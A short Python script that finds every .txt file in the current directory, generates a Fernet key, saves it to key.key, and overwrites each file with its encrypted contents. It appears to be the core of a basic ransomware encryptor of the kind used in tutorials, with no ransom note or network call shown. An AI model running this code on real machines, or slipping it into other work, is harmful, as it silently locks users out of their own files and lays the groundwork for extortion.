import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file.endswith('.txt'):
        files.append(file)

print(files)

key = Fernet.generate_key()
print(key)
with open('key.key', 'wb') as key_file:
    key_file.write(key)

for file in files:
    with open(file, 'rb') as f:
        data = f.read()

    encrypted = Fernet(key).encrypt(data)

    with open(file, 'wb') as f:
        f.write(encrypted)